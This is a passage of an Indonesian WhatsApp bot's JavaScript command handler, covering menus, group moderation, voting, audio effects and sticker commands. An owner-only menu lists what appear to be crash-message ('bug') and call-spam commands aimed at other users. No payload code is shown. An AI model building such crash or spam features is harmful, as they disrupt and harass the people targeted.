├│${prefix}public
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, ownerme, creator, m, { quoted: kafloc })
            }
            break
case 'anonymousmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
cht = `┌─❖ ⌜ Anonymous Menu ⌟
├│${prefix}anonymous
├│${prefix}start
├│${prefix}next
├│${prefix}keluar
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, cht, creator, m, { quoted: kafloc })
            }
            break
case 'databasemenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
dbm = `┌─❖ ⌜ Database Menu ⌟
├│${prefix}setcmd
├│${prefix}listcmd
├│${prefix}delcmd
├│${prefix}lockcmd
├│${prefix}addmsg
├│${prefix}listmsg
├│${prefix}getmsg
├│${prefix}delmsg
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, dbm, creator, m, { quoted: kafloc })
            }
            break
case 'islamicmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
islmm = `┌─❖ ⌜ Islamic Menu ⌟
├│${prefix}iqra
├│${prefix}hadist
├│${prefix}alquran
├│${prefix}juzamma
├│${prefix}tafsirquran
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'Owner' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, islmm, creator, m, { quoted: kafloc })
            }
            break
case 'chargermenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
chargermenu = `┌─❖ ⌜ Charger Menu ⌟
├│${prefix}bass
├│${prefix}blown
├│${prefix}deep
├│${prefix}earrape
├│${prefix}fast
├│${prefix}fat
├│${prefix}nightcore
├│${prefix}reverse
├│${prefix}robot
├│${prefix}slow
├│${prefix}tupai
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, chargermenu, creator, m, { quoted: kafloc })
            }
            break
case 'makermenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
mkrmnu = `┌─❖ ⌜ Maker Menu ⌟
├│${prefix}crossfire
├│${prefix}ffcover
├│${prefix}beach
├│${prefix}igcertificate
├│${prefix}ytcertificate
├│${prefix}blackpink
├│${prefix}glass
├│${prefix}galaxy
├│${prefix}neon
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, mkrmnu, creator, m, { quoted: kafloc })
            }
            break
case 'bugmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!isCreator) throw mess.owner
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
bug = `┌─❖ ⌜ Bug Menu (khusus owner) ⌟
├│${prefix}inibug
├│${prefix}poll
├│${prefix}troli2
├│${prefix}santetdia
├│${prefix}santetgc
├│${prefix}docu
├│${prefix}duc
├│${prefix}bug1
├│${prefix}bug2
├│${prefix}bug3
├│${prefix}bug4
├│${prefix}bug5
├│${prefix}bug6
├│${prefix}bug7
├│${prefix}lokas
├│${prefix}buglokas
├│${prefix}buginvite
├│${prefix}troli
├│${prefix}catalog
├│${prefix}cataloggc
├│${prefix}ampas1
├│${prefix}ampas2
├│${prefix}bugstik
├│${prefix}bugie
├│${prefix}bugtag
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, bug, creator, m, { quoted: kafloc })
            }
            break
case 'soundmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!isPremium) throw mess.prem
sm = `┌─❖ ⌜ SOUND MENU [KHUSUS PREM] ⌟
├│${prefix}sound1
├│${prefix}sound2
├│${prefix}sound3
├│${prefix}sound4
├│${prefix}sound5
├│${prefix}sound6
├│${prefix}sound7
├│${prefix}sound8
├│${prefix}sound9
├│${prefix}sound10
├│${prefix}sound11
├│${prefix}sound12
├│${prefix}sound13
├│${prefix}sound14
├│${prefix}sound15
├│${prefix}sound16
├│${prefix}sound17
├│${prefix}sound18
├│${prefix}sound19
├│${prefix}sound20
├│${prefix}sound21
├│${prefix}sound22
├│${prefix}sound23
├│${prefix}sound24
├│${prefix}sound25
├│${prefix}sound26
├│${prefix}sound27
├│${prefix}sound28
├│${prefix}sound29
├│${prefix}sound30
├│${prefix}sound31
├│${prefix}sound32
├│${prefix}sound33
├│${prefix}sound34
├│${prefix}sound35

NOTE : FITUR SOUND MENU NYA 74 YA, TAPI OWNERNYA MLES NGETIK:V
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, sm, creator, m, { quoted: kafloc })
            }
            break
case 'donasi': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
donasi = `*「 🐰DONASI BY NAIN OFC🐰 」*

• Payment : Ovo/Dana/Gopay
• Nomor Payment : Cht Owner!
• Pulsa : ${global.pulsa}

Donasi Ya Kak!! Biar Bot On Terus!`
let buttons = [{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
await liaacans.sendButtonText(m.chat, buttons, donasi, creator, m, { quoted: kafloc })
}
break
case 'mainmenu': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
mainmenu = `┌─❖ ⌜ Main Menu ⌟
├│${prefix}sewabot
├│${prefix}tts
├│${prefix}spamcall
├│${prefix}ssweb-pc
├│${prefix}ssweb-hp
├│${prefix}infogempa
├│${prefix}topupmenu
├│${prefix}tts
├│${prefix}shopeepay
├│${prefix}ovo
├│${prefix}listdmff
├│${prefix}listdmml
├│${prefix}listdmml2
├│${prefix}buypulsa
├│${prefix}topupff
├│${prefix}topupml
├│${prefix}topupml2
├│${prefix}topupff2
├│${prefix}rules
├│${prefix}caraorder
├│${prefix}cekstatus
├│${prefix}item
├│${prefix}additem
├│${prefix}delitem
├│${prefix}changeitem
├│${prefix}runtime
└─❖`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️BACK MENU' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'RULES BOT' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'OWNER' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, mainmenu, creator, m, { quoted: kafloc })
            }
break
case 'sc': case 'script': case 'sourcecode': {
if (cekUser("id", m.sender) == null) throw mess.user
let kafloc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: `${global.fake}`,jpegThumbnail: global.thumb}}}
source =`Script Bot Ini Bersifat Private
Kalau Mau Beli Script Bot Chat Owner Ya! 
Klik Di Button Ya Atau Ketik ${prefix}owner`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: '️Back Menu' }, type: 1 },{ buttonId: 'ping', buttonText: { displayText: 'Status Bot' }, type: 1 },{ buttonId: 'owner', buttonText: { displayText: 'Owner' }, type: 1 }]
            await liaacans.sendButtonText(m.chat, buttons, source, creator, m, { quoted: kafloc })
            }
break
case 'revoke': {
if (cekUser("id", m.sender) == null) throw mess.user
  if (!m.isGroup) return m.reply(mess.group)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  if (!isAdmins) return m.reply(mess.admin)
  await liaacans.groupRevokeInvite(m.chat)
  m.reply(`SUKSES RESET LINK GRUP`)
  }
  break
case 'kick': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(`Sukses Kick Member Tidak Berguna`))
}
break
case 'add': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(`Sukses Add Member Berguna`))
}
break
case 'promote': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(`Sukses Member Sebagai Admin`))
}
break
case 'demote': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await liaacans.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(`Sukses Admin Sebagai Member`))
}
break
case 'setname': case 'setsubject': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Teks Nya Mana Bos ?'
await liaacans.groupUpdateSubject(m.chat, text).then((res) => m.reply(`Sukses Setname Grup Ini!`))
}
break
case 'setdesc': case 'setdesk': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Teks Nya Mana Bos ?'
await liaacans.groupUpdateDescription(m.chat, text).then((res) => m.reply(`Sukses Setdesc Grup Ini`))
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await liaacans.downloadAndSaveMediaMessage(quoted)
await liaacans.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(mess.success)
}
break
case 'tagall': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let teks = `──── ⌜ Tag All ⌟ ────
 
 ❗ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
liaacans.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: fkontak })
}
break
case 'hidetag': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
liaacans.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fkontak })
}

break
case 'vote': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
vote[m.chat] = [q, [], []]
await sleep(1000)
upvote = vote[m.chat][1]
devote = vote[m.chat][2]
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
]

let buttonMessageVote = {
text: teks_vote,
footer: creator,
buttons: buttonsVote,
headerType: 1
}
liaacans.sendMessage(m.chat, buttonMessageVote)
}
break
case 'upvote': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][1].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsUpvote = [
{buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
{buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
]

let buttonMessageUpvote = {
text: teks_vote,
footer: creator,
buttons: buttonsUpvote,
headerType: 1,
mentions: menvote
}
liaacans.sendMessage(m.chat, buttonMessageUpvote)
}
break
case 'devote': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][2].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsDevote = [
{buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
{buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
]

let buttonMessageDevote = {
text: teks_vote,
footer: creator,
buttons: buttonsDevote,
headerType: 1,
mentions: menvote
}
liaacans.sendMessage(m.chat, buttonMessageDevote)
}
break
case 'cekvote':
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${liaacans.user.id}
`
liaacans.sendTextWithMentions(m.chat, teks_vote, m)
break
case 'deletevote': case'delvote': case 'hapusvote': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
delete vote[m.chat]
m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
}
break
case 'group': case 'grup': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === 'close'){
await liaacans.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await liaacans.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'OPEN' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'CLOSE' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, `Mode Group`, creator, m)
}
}
break
case 'editinfo': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === 'open'){
await liaacans.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'close'){
await liaacans.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`))
} else {
let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'OPEN' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'CLOSE' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, `Mode Edit Info`, creator, m)
}
}
break
case 'antilink': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antilink = true
m.reply(`Antilink Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antilink = false
m.reply(`Antilink Tidak Aktif !`)
} else {
let buttons = [
{ buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, `Mode Antilink`, creator, m)
}
}
break
case 'antilinkig': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinkig) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antilinkig = true
m.reply(`Antilink Insta Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinkig) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antilinkig = false
m.reply(`Antilink Insta Tidak Aktif !`)
} else {
let buttons = [
{ buttonId: 'antilinkig on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antilinkig off', buttonText: { displayText: 'Off' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, `Mode Antilink Insta`, creator, m)
}
}
break
case 'antiviewonce': {
if (!m.isGroup) throw mess.group
if (!isCreator) throw mess.owner
if (args[0] === "on") {
if (db.data.chats[m.chat].antiviewonce) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antiviewonce = true
m.reply(`Antiviewonce Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antiviewonce) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antiviewonce = false
m.reply(`Antiviewonce Tidak Aktif !`)
} else {
let buttons = [
{ buttonId: 'antiviewonce on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antiviewonce off', buttonText: { displayText: 'Off' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, `Mode Antiviewonce`, creator, m)
}
}
break
case 'antiwame': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antiwame) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antiwame = true
m.reply(`Antiwame Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antiwame) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antiwame = false
m.reply(`Antiwame Tidak Aktif !`)
} else {
let buttons = [
{ buttonId: 'antiwame on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antiwame off', buttonText: { displayText: 'Off' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, `Mode Antiwame`, creator, m)
}
}
break
case 'mute': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].mute = true
m.reply(`${liaacans.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].mute = false
m.reply(`${liaacans.user.name} telah di unmute di group ini !`)
} else {
let buttons = [
{ buttonId: 'mute on', buttonText: { displayText: 'ON' }, type: 1 },
{ buttonId: 'mute off', buttonText: { displayText: 'OFF' }, type: 1 }
]
await liaacans.sendButtonText(m.chat, buttons, `Mute Bot`, creator, m)
}
}
break
case 'linkgroup': case 'linkgc': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
let response = await liaacans.groupInviteCode(m.chat)
liaacans.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'ephemeral': {
if (cekUser("id", m.sender) == null) throw mess.user
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await liaacans.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await liaacans.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break
case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'igcertificate': case 'ytcertificate': {
if (cekUser("id", m.sender) == null) throw mess.user
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                liaacans.sendMessage(m.chat, { image: { url: api('liaacans', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
case 'blackpink': {
if (cekUser("id", m.sender) == null) throw mess.user
      if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                liaacans.sendMessage(m.chat, { image: { url:  fetchJson('https://restapi-liaacans.herokuapp.com/api/textpro/black-pink?text=Revita&apikey=APIKEY') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
if (cekUser("id", m.sender) == null) throw mess.user
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await liaacans.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                liaacans.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
            if (cekUser("id", m.sender) == null) throw mess.user
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
            if (cekUser("id", m.sender) == null) throw mess.user
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
            if (cekUser("id", m.sender) == null) throw mess.user
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                liaacans.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
            if (cekUser("id", m.sender) == null) throw mess.user
                if (!isCreator) throw mess.owner
